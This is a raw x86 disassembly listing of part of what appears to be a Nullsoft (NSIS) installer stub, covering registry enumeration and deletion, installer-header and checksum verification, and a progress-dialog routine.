  402bd7:	6a 05                	push   $0x5
  402bd9:	e8 9f 3d 00 00       	call   0x40697d
  402bde:	6a 22                	push   $0x22
  402be0:	8b f0                	mov    %eax,%esi
  402be2:	e8 eb 01 00 00       	call   0x402dd2
  402be7:	3b f3                	cmp    %ebx,%esi
  402be9:	74 37                	je     0x402c22
  402beb:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402bee:	51                   	push   %ecx
  402bef:	50                   	push   %eax
  402bf0:	ff 15 9c 82 40 00    	call   *0x40829c
  402bf6:	85 c0                	test   %eax,%eax
  402bf8:	7c 28                	jl     0x402c22
  402bfa:	8d 45 08             	lea    0x8(%ebp),%eax
  402bfd:	50                   	push   %eax
  402bfe:	53                   	push   %ebx
  402bff:	ff 75 dc             	push   -0x24(%ebp)
  402c02:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402c05:	50                   	push   %eax
  402c06:	ff d6                	call   *%esi
  402c08:	85 c0                	test   %eax,%eax
  402c0a:	7c 16                	jl     0x402c22
  402c0c:	ff 75 08             	push   0x8(%ebp)
  402c0f:	ff 75 f4             	push   -0xc(%ebp)
  402c12:	e8 72 39 00 00       	call   0x406589
  402c17:	ff 75 08             	push   0x8(%ebp)
  402c1a:	ff 15 a0 82 40 00    	call   *0x4082a0
  402c20:	eb 34                	jmp    0x402c56
  402c22:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402c25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402c2c:	66 89 18             	mov    %bx,(%eax)
  402c2f:	eb 25                	jmp    0x402c56
  402c31:	8b 0d 08 4f 42 00    	mov    0x424f08,%ecx
  402c37:	53                   	push   %ebx
  402c38:	23 c8                	and    %eax,%ecx
  402c3a:	51                   	push   %ecx
  402c3b:	6a 0b                	push   $0xb
  402c3d:	ff 75 f8             	push   -0x8(%ebp)
  402c40:	ff 15 58 82 40 00    	call   *0x408258
  402c46:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402c49:	74 0b                	je     0x402c56
  402c4b:	53                   	push   %ebx
  402c4c:	53                   	push   %ebx
  402c4d:	ff 75 f8             	push   -0x8(%ebp)
  402c50:	ff 15 54 82 40 00    	call   *0x408254
  402c56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c59:	01 05 a8 9a 42 00    	add    %eax,0x429aa8
  402c5f:	33 c0                	xor    %eax,%eax
  402c61:	5f                   	pop    %edi
  402c62:	5e                   	pop    %esi
  402c63:	5b                   	pop    %ebx
  402c64:	c9                   	leave
  402c65:	c2 04 00             	ret    $0x4
  402c68:	61                   	popa
  402c69:	2c 40                	sub    $0x40,%al
  402c6b:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402c71:	14 40                	adc    $0x40,%al
  402c73:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402c79:	14 40                	adc    $0x40,%al
  402c7b:	00 d7                	add    %dl,%bh
  402c7d:	14 40                	adc    $0x40,%al
  402c7f:	00 f5                	add    %dh,%ch
  402c81:	14 40                	adc    $0x40,%al
  402c83:	00 98 15 40 00 c8    	add    %bl,-0x37ffbfeb(%eax)
  402c89:	15 40 00 e6 15       	adc    $0x15e60040,%eax
  402c8e:	40                   	inc    %eax
  402c8f:	00 96 16 40 00 03    	add    %dl,0x3004016(%esi)
  402c95:	15 40 00 67 15       	adc    $0x15670040,%eax
  402c9a:	40                   	inc    %eax
  402c9b:	00 88 15 40 00 a7    	add    %cl,-0x58ffbfeb(%eax)
  402ca1:	16                   	push   %ss
  402ca2:	40                   	inc    %eax
  402ca3:	00 f8                	add    %bh,%al
  402ca5:	16                   	push   %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 61 17             	add    %ah,0x17(%ecx)
  402caa:	40                   	inc    %eax
  402cab:	00 88 17 40 00 9b    	add    %cl,-0x64ffbfe9(%eax)
  402cb1:	17                   	pop    %ss
  402cb2:	40                   	inc    %eax
  402cb3:	00 38                	add    %bh,(%eax)
  402cb5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cb8:	3b 19                	cmp    (%ecx),%ebx
  402cba:	40                   	inc    %eax
  402cbb:	00 6d 19             	add    %ch,0x19(%ebp)
  402cbe:	40                   	inc    %eax
  402cbf:	00 82 19 40 00 94    	add    %al,-0x6bffbfe7(%edx)
  402cc5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cc8:	2b 1a                	sub    (%edx),%ebx
  402cca:	40                   	inc    %eax
  402ccb:	00 5c 1a 40          	add    %bl,0x40(%edx,%ebx,1)
  402ccf:	00 9e 1a 40 00 de    	add    %bl,-0x21ffbfe6(%esi)
  402cd5:	1a 40 00             	sbb    0x0(%eax),%al
  402cd8:	a3 1b 40 00 c7       	mov    %eax,0xc700401b
  402cdd:	1b 40 00             	sbb    0x0(%eax),%eax
  402ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 6f 1c             	add    %ch,0x1c(%edi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 43 1d             	add    %al,0x1d(%ebx)
  402cea:	40                   	inc    %eax
  402ceb:	00 64 1d 40          	add    %ah,0x40(%ebp,%ebx,1)
  402cef:	00 89 1d 40 00 ad    	add    %cl,-0x52ffbfe3(%ecx)
  402cf5:	1d 40 00 7a 1e       	sbb    $0x1e7a0040,%eax
  402cfa:	40                   	inc    %eax
  402cfb:	00 0a                	add    %cl,(%edx)
  402cfd:	1f                   	pop    %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 3e                	add    %bh,(%esi)
  402d01:	1f                   	pop    %ds
  402d02:	40                   	inc    %eax
  402d03:	00 d0                	add    %dl,%al
  402d05:	1f                   	pop    %ds
  402d06:	40                   	inc    %eax
  402d07:	00 22                	add    %ah,(%edx)
  402d09:	20 40 00             	and    %al,0x0(%eax)
  402d0c:	56                   	push   %esi
  402d0d:	20 40 00             	and    %al,0x0(%eax)
  402d10:	03 21                	add    (%ecx),%esp
  402d12:	40                   	inc    %eax
  402d13:	00 d6                	add    %dl,%dh
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	2b 23                	sub    (%ebx),%esp
  402d1a:	40                   	inc    %eax
  402d1b:	00 af 23 40 00 de    	add    %ch,-0x21ffbfdd(%edi)
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	20 24 40             	and    %ah,(%eax,%eax,2)
  402d27:	00 60 24             	add    %ah,0x24(%eax)
  402d2a:	40                   	inc    %eax
  402d2b:	00 b6 24 40 00 56    	add    %dh,0x56004024(%esi)
  402d31:	25 40 00 ca 25       	and    $0x25ca0040,%eax
  402d36:	40                   	inc    %eax
  402d37:	00 34 26             	add    %dh,(%esi,%eiz,1)
  402d3a:	40                   	inc    %eax
  402d3b:	00 48 26             	add    %cl,0x26(%eax)
  402d3e:	40                   	inc    %eax
  402d3f:	00 6a 26             	add    %ch,0x26(%edx)
  402d42:	40                   	inc    %eax
  402d43:	00 18                	add    %bl,(%eax)
  402d45:	27                   	daa
  402d46:	40                   	inc    %eax
  402d47:	00 bb 28 40 00 f0    	add    %bh,-0xfffbfd8(%ebx)
  402d4d:	28 40 00             	sub    %al,0x0(%eax)
  402d50:	0a 29                	or     (%ecx),%ch
  402d52:	40                   	inc    %eax
  402d53:	00 37                	add    %dh,(%edi)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	7c 29                	jl     0x402d83
  402d5a:	40                   	inc    %eax
  402d5b:	00 87 2a 40 00 17    	add    %al,0x1700402a(%edi)
  402d61:	2b 40 00             	sub    0x0(%eax),%eax
  402d64:	85 2b                	test   %ebp,(%ebx)
  402d66:	40                   	inc    %eax
  402d67:	00 56 2c             	add    %dl,0x2c(%esi)
  402d6a:	40                   	inc    %eax
  402d6b:	00 31                	add    %dh,(%ecx)
  402d6d:	2c 40                	sub    $0x40,%al
  402d6f:	00 6a 26             	add    %ch,0x26(%edx)
  402d72:	40                   	inc    %eax
  402d73:	00 18                	add    %bl,(%eax)
  402d75:	27                   	daa
  402d76:	40                   	inc    %eax
  402d77:	00 0e                	add    %cl,(%esi)
  402d79:	1b 40 00             	sbb    0x0(%eax),%eax
  402d7c:	15 1b 40 00 1c       	adc    $0x1c00401b,%eax
  402d81:	1b 40 00             	sbb    0x0(%eax),%eax
  402d84:	21 1b                	and    %ebx,(%ebx)
  402d86:	40                   	inc    %eax
  402d87:	00 31                	add    %dh,(%ecx)
  402d89:	1b 40 00             	sbb    0x0(%eax),%eax
  402d8c:	35 1b 40 00 39       	xor    $0x3900401b,%eax
  402d91:	1b 40 00             	sbb    0x0(%eax),%eax
  402d94:	42                   	inc    %edx
  402d95:	1b 40 00             	sbb    0x0(%eax),%eax
  402d98:	4b                   	dec    %ebx
  402d99:	1b 40 00             	sbb    0x0(%eax),%eax
  402d9c:	58                   	pop    %eax
  402d9d:	1b 40 00             	sbb    0x0(%eax),%eax
  402da0:	68 1b 40 00 86       	push   $0x8600401b
  402da5:	1b 40 00             	sbb    0x0(%eax),%eax
  402da8:	8d 1b                	lea    (%ebx),%ebx
  402daa:	40                   	inc    %eax
  402dab:	00 94 1b 40 00 8b 44 	add    %dl,0x448b0040(%ebx,%ebx,1)
  402db2:	24 04                	and    $0x4,%al
  402db4:	8b 0d 24 ce 40 00    	mov    0x40ce24,%ecx
  402dba:	56                   	push   %esi
  402dbb:	ff 34 81             	push   (%ecx,%eax,4)
  402dbe:	6a 00                	push   $0x0
  402dc0:	e8 01 38 00 00       	call   0x4065c6
  402dc5:	8b f0                	mov    %eax,%esi
  402dc7:	56                   	push   %esi
  402dc8:	e8 1c 37 00 00       	call   0x4064e9
  402dcd:	0f b7 16             	movzwl (%esi),%edx
  402dd0:	5e                   	pop    %esi
  402dd1:	c3                   	ret
  402dd2:	56                   	push   %esi
  402dd3:	8b 74 24 08          	mov    0x8(%esp),%esi
  402dd7:	85 f6                	test   %esi,%esi
  402dd9:	57                   	push   %edi
  402dda:	8b c6                	mov    %esi,%eax
  402ddc:	7d 02                	jge    0x402de0
  402dde:	f7 d8                	neg    %eax
  402de0:	8b 15 24 ce 40 00    	mov    0x40ce24,%edx
  402de6:	8b c8                	mov    %eax,%ecx
  402de8:	83 e1 0f             	and    $0xf,%ecx
  402deb:	c1 f8 04             	sar    $0x4,%eax
  402dee:	ff 34 8a             	push   (%edx,%ecx,4)
  402df1:	c1 e0 0b             	shl    $0xb,%eax
  402df4:	05 c8 a5 40 00       	add    $0x40a5c8,%eax
  402df9:	50                   	push   %eax
  402dfa:	e8 c7 37 00 00       	call   0x4065c6
  402dff:	85 f6                	test   %esi,%esi
  402e01:	8b f8                	mov    %eax,%edi
  402e03:	7d 06                	jge    0x402e0b
  402e05:	57                   	push   %edi
  402e06:	e8 2c 3a 00 00       	call   0x406837
  402e0b:	8b c7                	mov    %edi,%eax
  402e0d:	5f                   	pop    %edi
  402e0e:	5e                   	pop    %esi
  402e0f:	c2 04 00             	ret    $0x4
  402e12:	55                   	push   %ebp
  402e13:	8b ec                	mov    %esp,%ebp
  402e15:	8d 45 08             	lea    0x8(%ebp),%eax
  402e18:	50                   	push   %eax
  402e19:	8b 45 08             	mov    0x8(%ebp),%eax
  402e1c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e21:	50                   	push   %eax
  402e22:	6a 22                	push   $0x22
  402e24:	e8 a9 ff ff ff       	call   0x402dd2
  402e29:	50                   	push   %eax
  402e2a:	a1 24 ce 40 00       	mov    0x40ce24,%eax
  402e2f:	ff 70 04             	push   0x4(%eax)
  402e32:	e8 13 00 00 00       	call   0x402e4a
  402e37:	50                   	push   %eax
  402e38:	e8 b9 35 00 00       	call   0x4063f6
  402e3d:	f7 d8                	neg    %eax
  402e3f:	1b c0                	sbb    %eax,%eax
  402e41:	f7 d0                	not    %eax
  402e43:	23 45 08             	and    0x8(%ebp),%eax
  402e46:	5d                   	pop    %ebp
  402e47:	c2 04 00             	ret    $0x4
  402e4a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e4e:	85 c0                	test   %eax,%eax
  402e50:	7c 0d                	jl     0x402e5f
  402e52:	8b 0d a4 9a 42 00    	mov    0x429aa4,%ecx
  402e58:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402e5f:	c2 04 00             	ret    $0x4
  402e62:	55                   	push   %ebp
  402e63:	8b ec                	mov    %esp,%ebp
  402e65:	8d 45 10             	lea    0x10(%ebp),%eax
  402e68:	50                   	push   %eax
  402e69:	8b 45 10             	mov    0x10(%ebp),%eax
  402e6c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e71:	50                   	push   %eax
  402e72:	ff 75 0c             	push   0xc(%ebp)
  402e75:	ff 75 08             	push   0x8(%ebp)
  402e78:	e8 cd ff ff ff       	call   0x402e4a
  402e7d:	50                   	push   %eax
  402e7e:	e8 a1 35 00 00       	call   0x406424
  402e83:	f7 d8                	neg    %eax
  402e85:	1b c0                	sbb    %eax,%eax
  402e87:	f7 d0                	not    %eax
  402e89:	23 45 10             	and    0x10(%ebp),%eax
  402e8c:	5d                   	pop    %ebp
  402e8d:	c2 0c 00             	ret    $0xc
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	56                   	push   %esi
  402e94:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e97:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e9b:	75 07                	jne    0x402ea4
  402e9d:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402ea2:	eb 2c                	jmp    0x402ed0
  402ea4:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402eab:	8d 45 10             	lea    0x10(%ebp),%eax
  402eae:	50                   	push   %eax
  402eaf:	ff 75 08             	push   0x8(%ebp)
  402eb2:	e8 93 ff ff ff       	call   0x402e4a
  402eb7:	50                   	push   %eax
  402eb8:	e8 b8 34 00 00       	call   0x406375
  402ebd:	85 c0                	test   %eax,%eax
  402ebf:	74 0c                	je     0x402ecd
  402ec1:	ff 75 10             	push   0x10(%ebp)
  402ec4:	56                   	push   %esi
  402ec5:	50                   	push   %eax
  402ec6:	e8 0a 00 00 00       	call   0x402ed5
  402ecb:	eb 03                	jmp    0x402ed0
  402ecd:	6a 06                	push   $0x6
  402ecf:	58                   	pop    %eax
  402ed0:	5e                   	pop    %esi
  402ed1:	5d                   	pop    %ebp
  402ed2:	c2 0c 00             	ret    $0xc
  402ed5:	55                   	push   %ebp
  402ed6:	8b ec                	mov    %esp,%ebp
  402ed8:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402ede:	53                   	push   %ebx
  402edf:	56                   	push   %esi
  402ee0:	8b 75 10             	mov    0x10(%ebp),%esi
  402ee3:	57                   	push   %edi
  402ee4:	8b fe                	mov    %esi,%edi
  402ee6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ee9:	81 e6 00 03 00 00    	and    $0x300,%esi
  402eef:	50                   	push   %eax
  402ef0:	8b c6                	mov    %esi,%eax
  402ef2:	83 e7 01             	and    $0x1,%edi
  402ef5:	0c 09                	or     $0x9,%al
  402ef7:	50                   	push   %eax
  402ef8:	ff 75 0c             	push   0xc(%ebp)
  402efb:	ff 75 08             	push   0x8(%ebp)
  402efe:	e8 f3 34 00 00       	call   0x4063f6
  402f03:	33 db                	xor    %ebx,%ebx
  402f05:	3b c3                	cmp    %ebx,%eax
  402f07:	0f 85 ab 00 00 00    	jne    0x402fb8
  402f0d:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402f11:	74 23                	je     0x402f36
  402f13:	53                   	push   %ebx
  402f14:	53                   	push   %ebx
  402f15:	53                   	push   %ebx
  402f16:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402f19:	53                   	push   %ebx
  402f1a:	50                   	push   %eax
  402f1b:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f21:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402f24:	50                   	push   %eax
  402f25:	53                   	push   %ebx
  402f26:	ff 75 fc             	push   -0x4(%ebp)
  402f29:	ff 15 00 80 40 00    	call   *0x408000
  402f2f:	3d 03 01 00 00       	cmp    $0x103,%eax
  402f34:	75 67                	jne    0x402f9d
  402f36:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f3c:	68 05 01 00 00       	push   $0x105
  402f41:	50                   	push   %eax
  402f42:	53                   	push   %ebx
  402f43:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402f49:	eb 27                	jmp    0x402f72
  402f4b:	85 ff                	test   %edi,%edi
  402f4d:	75 4e                	jne    0x402f9d
  402f4f:	ff 75 10             	push   0x10(%ebp)
  402f52:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f58:	50                   	push   %eax
  402f59:	ff 75 fc             	push   -0x4(%ebp)
  402f5c:	e8 74 ff ff ff       	call   0x402ed5
  402f61:	85 c0                	test   %eax,%eax
  402f63:	75 16                	jne    0x402f7b
  402f65:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f6b:	68 05 01 00 00       	push   $0x105
  402f70:	50                   	push   %eax
  402f71:	57                   	push   %edi
  402f72:	ff 75 fc             	push   -0x4(%ebp)
  402f75:	ff d3                	call   *%ebx
  402f77:	85 c0                	test   %eax,%eax
  402f79:	74 d0                	je     0x402f4b
  402f7b:	ff 75 fc             	push   -0x4(%ebp)
  402f7e:	ff 15 10 80 40 00    	call   *0x408010
  402f84:	6a 03                	push   $0x3
  402f86:	e8 f2 39 00 00       	call   0x40697d
  402f8b:	85 c0                	test   %eax,%eax
  402f8d:	75 1e                	jne    0x402fad
  402f8f:	ff 75 0c             	push   0xc(%ebp)
  402f92:	ff 75 08             	push   0x8(%ebp)
  402f95:	ff 15 18 80 40 00    	call   *0x408018
  402f9b:	eb 1b                	jmp    0x402fb8
  402f9d:	ff 75 fc             	push   -0x4(%ebp)
  402fa0:	ff 15 10 80 40 00    	call   *0x408010
  402fa6:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402fab:	eb 0b                	jmp    0x402fb8
  402fad:	6a 00                	push   $0x0
  402faf:	56                   	push   %esi
  402fb0:	ff 75 0c             	push   0xc(%ebp)
  402fb3:	ff 75 08             	push   0x8(%ebp)
  402fb6:	ff d0                	call   *%eax
  402fb8:	5f                   	pop    %edi
  402fb9:	5e                   	pop    %esi
  402fba:	5b                   	pop    %ebx
  402fbb:	c9                   	leave
  402fbc:	c2 0c 00             	ret    $0xc
  402fbf:	55                   	push   %ebp
  402fc0:	8b ec                	mov    %esp,%ebp
  402fc2:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fc8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402fcf:	75 19                	jne    0x402fea
  402fd1:	6a 00                	push   $0x0
  402fd3:	68 fa 00 00 00       	push   $0xfa
  402fd8:	6a 01                	push   $0x1
  402fda:	ff 75 08             	push   0x8(%ebp)
  402fdd:	ff 15 18 82 40 00    	call   *0x408218
  402fe3:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402fea:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402ff1:	75 4c                	jne    0x40303f
  402ff3:	8b 0d b8 ce 40 00    	mov    0x40ceb8,%ecx
  402ff9:	a1 c4 0e 42 00       	mov    0x420ec4,%eax
  402ffe:	3b c8                	cmp    %eax,%ecx
  403000:	72 02                	jb     0x403004
  403002:	8b c8                	mov    %eax,%ecx
  403004:	50                   	push   %eax
  403005:	6a 64                	push   $0x64
  403007:	51                   	push   %ecx
  403008:	ff 15 48 81 40 00    	call   *0x408148
  40300e:	50                   	push   %eax
  40300f:	8d 45 80             	lea    -0x80(%ebp),%eax
  403012:	68 1c a0 40 00       	push   $0x40a01c
  403017:	50                   	push   %eax
  403018:	ff 15 2c 82 40 00    	call   *0x40822c
  40301e:	83 c4 0c             	add    $0xc,%esp
  403021:	8d 45 80             	lea    -0x80(%ebp),%eax
  403024:	50                   	push   %eax
  403025:	ff 75 08             	push   0x8(%ebp)
  403028:	ff 15 1c 82 40 00    	call   *0x40821c
  40302e:	8d 45 80             	lea    -0x80(%ebp),%eax
  403031:	50                   	push   %eax
  403032:	68 06 04 00 00       	push   $0x406
  403037:	ff 75 08             	push   0x8(%ebp)
  40303a:	e8 88 2b 00 00       	call   0x405bc7
  40303f:	33 c0                	xor    %eax,%eax
  403041:	c9                   	leave
  403042:	c2 10 00             	ret    $0x10
  403045:	56                   	push   %esi
  403046:	33 f6                	xor    %esi,%esi
  403048:	39 74 24 08          	cmp    %esi,0x8(%esp)
  40304c:	74 18                	je     0x403066
  40304e:	a1 c0 0e 42 00       	mov    0x420ec0,%eax
  403053:	3b c6                	cmp    %esi,%eax
  403055:	74 07                	je     0x40305e
  403057:	50                   	push   %eax
  403058:	ff 15 10 82 40 00    	call   *0x408210
  40305e:	89 35 c0 0e 42 00    	mov    %esi,0x420ec0
  403064:	5e                   	pop    %esi
  403065:	c3                   	ret
  403066:	39 35 c0 0e 42 00    	cmp    %esi,0x420ec0
  40306c:	74 08                	je     0x403076
  40306e:	56                   	push   %esi
  40306f:	e8 45 39 00 00       	call   0x4069b9
  403074:	5e                   	pop    %esi
  403075:	c3                   	ret
  403076:	ff 15 d0 80 40 00    	call   *0x4080d0
  40307c:	3b 05 2c 9a 42 00    	cmp    0x429a2c,%eax
  403082:	76 23                	jbe    0x4030a7
  403084:	56                   	push   %esi
  403085:	68 bf 2f 40 00       	push   $0x402fbf
  40308a:	56                   	push   %esi
  40308b:	6a 6f                	push   $0x6f
  40308d:	ff 35 20 9a 42 00    	push   0x429a20
  403093:	ff 15 14 82 40 00    	call   *0x408214
  403099:	6a 05                	push   $0x5
  40309b:	50                   	push   %eax
  40309c:	a3 c0 0e 42 00       	mov    %eax,0x420ec0
  4030a1:	ff 15 28 82 40 00    	call   *0x408228
  4030a7:	5e                   	pop    %esi
  4030a8:	c3                   	ret
  4030a9:	55                   	push   %ebp
  4030aa:	8b ec                	mov    %esp,%ebp
  4030ac:	83 ec 28             	sub    $0x28,%esp
  4030af:	53                   	push   %ebx
  4030b0:	56                   	push   %esi
  4030b1:	57                   	push   %edi
  4030b2:	33 ff                	xor    %edi,%edi
  4030b4:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4030b7:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4030ba:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4030bd:	ff 15 d0 80 40 00    	call   *0x4080d0
  4030c3:	be 00 78 43 00       	mov    $0x437800,%esi
  4030c8:	68 00 04 00 00       	push   $0x400
  4030cd:	05 e8 03 00 00       	add    $0x3e8,%eax
  4030d2:	56                   	push   %esi
  4030d3:	57                   	push   %edi
  4030d4:	a3 2c 9a 42 00       	mov    %eax,0x429a2c
  4030d9:	ff 15 c4 80 40 00    	call   *0x4080c4
  4030df:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4030e4:	eb 27                	jmp    0x40310d
  4030e6:	ff 15 c8 80 40 00    	call   *0x4080c8
  4030ec:	83 f8 20             	cmp    $0x20,%eax
  4030ef:	0f 85 1c 01 00 00    	jne    0x403211
  4030f5:	ff 45 fc             	incl   -0x4(%ebp)
  4030f8:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
  4030fc:	0f 87 0f 01 00 00    	ja     0x403211
  403102:	68 fa 00 00 00       	push   $0xfa
  403107:	ff 15 d4 80 40 00    	call   *0x4080d4
  40310d:	6a 03                	push   $0x3
  40310f:	57                   	push   %edi
  403110:	56                   	push   %esi
  403111:	e8 63 2f 00 00       	call   0x406079
  403116:	8b d8                	mov    %eax,%ebx
  403118:	83 fb ff             	cmp    $0xffffffff,%ebx
  40311b:	89 1d 18 a0 40 00    	mov    %ebx,0x40a018
  403121:	74 c3                	je     0x4030e6
  403123:	56                   	push   %esi
  403124:	be 00 58 43 00       	mov    $0x435800,%esi
  403129:	56                   	push   %esi
  40312a:	e8 5a 34 00 00       	call   0x406589
  40312f:	56                   	push   %esi
  403130:	e8 6f 2d 00 00       	call   0x405ea4
  403135:	50                   	push   %eax
  403136:	68 00 80 43 00       	push   $0x438000
  40313b:	e8 49 34 00 00       	call   0x406589
  403140:	6a 00                	push   $0x0
  403142:	53                   	push   %ebx
  403143:	ff 15 cc 80 40 00    	call   *0x4080cc
  403149:	85 c0                	test   %eax,%eax
  40314b:	a3 c4 0e 42 00       	mov    %eax,0x420ec4
  403150:	8b f0                	mov    %eax,%esi
  403152:	0f 86 f8 00 00 00    	jbe    0x403250
  403158:	a1 34 9a 42 00       	mov    0x429a34,%eax
  40315d:	8b fe                	mov    %esi,%edi
  40315f:	f7 d8                	neg    %eax
  403161:	1b c0                	sbb    %eax,%eax
  403163:	25 00 7e 00 00       	and    $0x7e00,%eax
  403168:	05 00 02 00 00       	add    $0x200,%eax
  40316d:	3b f0                	cmp    %eax,%esi
  40316f:	72 02                	jb     0x403173
  403171:	8b f8                	mov    %eax,%edi
  403173:	57                   	push   %edi
  403174:	68 c0 ce 40 00       	push   $0x40cec0
  403179:	e8 7b 03 00 00       	call   0x4034f9
  40317e:	85 c0                	test   %eax,%eax
  403180:	0f 84 36 01 00 00    	je     0x4032bc
  403186:	83 3d 34 9a 42 00 00 	cmpl   $0x0,0x429a34
  40318d:	0f 85 88 00 00 00    	jne    0x40321b
  403193:	6a 1c                	push   $0x1c
  403195:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403198:	68 c0 ce 40 00       	push   $0x40cec0
  40319d:	50                   	push   %eax
  40319e:	e8 91 2e 00 00       	call   0x406034
  4031a3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031a6:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031ab:	75 7c                	jne    0x403229
  4031ad:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  4031b4:	75 73                	jne    0x403229
  4031b6:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  4031bd:	75 6a                	jne    0x403229
  4031bf:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  4031c6:	75 61                	jne    0x403229
  4031c8:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  4031cf:	75 58                	jne    0x403229
  4031d1:	09 45 08             	or     %eax,0x8(%ebp)
  4031d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4031d7:	8b 0d b8 ce 40 00    	mov    0x40ceb8,%ecx
  4031dd:	83 e0 02             	and    $0x2,%eax
  4031e0:	09 05 c0 9a 42 00    	or     %eax,0x429ac0
  4031e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4031e9:	3b c6                	cmp    %esi,%eax
  4031eb:	89 0d 34 9a 42 00    	mov    %ecx,0x429a34
  4031f1:	0f 87 be 00 00 00    	ja     0x4032b5
  4031f7:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4031fb:	75 06                	jne    0x403203
  4031fd:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403201:	75 4d                	jne    0x403250
  403203:	ff 45 f8             	incl   -0x8(%ebp)
  403206:	8d 70 fc             	lea    -0x4(%eax),%esi
  403209:	3b fe                	cmp    %esi,%edi
  40320b:	76 1c                	jbe    0x403229
  40320d:	8b fe                	mov    %esi,%edi
  40320f:	eb 18                	jmp    0x403229
  403211:	b8 e8 a1 40 00       	mov    $0x40a1e8,%eax
  403216:	e9 f2 00 00 00       	jmp    0x40330d
  40321b:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  40321f:	75 08                	jne    0x403229
  403221:	6a 00                	push   $0x0
  403223:	e8 1d fe ff ff       	call   0x403045
  403228:	59                   	pop    %ecx
  403229:	3b 35 c4 0e 42 00    	cmp    0x420ec4,%esi
  40322f:	73 11                	jae    0x403242
  403231:	57                   	push   %edi
  403232:	68 c0 ce 40 00       	push   $0x40cec0
  403237:	ff 75 f4             	push   -0xc(%ebp)
  40323a:	e8 2b 38 00 00       	call   0x406a6a
  40323f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403242:	01 3d b8 ce 40 00    	add    %edi,0x40ceb8
  403248:	2b f7                	sub    %edi,%esi
  40324a:	0f 85 08 ff ff ff    	jne    0x403158
  403250:	6a 01                	push   $0x1
  403252:	e8 ee fd ff ff       	call   0x403045
  403257:	33 ff                	xor    %edi,%edi
  403259:	59                   	pop    %ecx
  40325a:	39 3d 34 9a 42 00    	cmp    %edi,0x429a34
  403260:	74 53                	je     0x4032b5
  403262:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  403265:	74 22                	je     0x403289
  403267:	ff 35 b8 ce 40 00    	push   0x40ceb8
  40326d:	e8 9d 02 00 00       	call   0x40350f
  403272:	8d 45 08             	lea    0x8(%ebp),%eax
  403275:	6a 04                	push   $0x4
  403277:	50                   	push   %eax
  403278:	e8 7c 02 00 00       	call   0x4034f9
  40327d:	85 c0                	test   %eax,%eax
  40327f:	74 34                	je     0x4032b5
  403281:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403284:	3b 45 08             	cmp    0x8(%ebp),%eax
  403287:	75 2c                	jne    0x4032b5
  403289:	ff 75 ec             	push   -0x14(%ebp)
  40328c:	6a 40                	push   $0x40
  40328e:	ff 15 10 81 40 00    	call   *0x408110
  403294:	8b f0                	mov    %eax,%esi
  403296:	a1 34 9a 42 00       	mov    0x429a34,%eax
  40329b:	83 c0 1c             	add    $0x1c,%eax
  40329e:	50                   	push   %eax
  40329f:	e8 6b 02 00 00       	call   0x40350f
  4032a4:	ff 75 ec             	push   -0x14(%ebp)
  4032a7:	56                   	push   %esi
  4032a8:	57                   	push   %edi
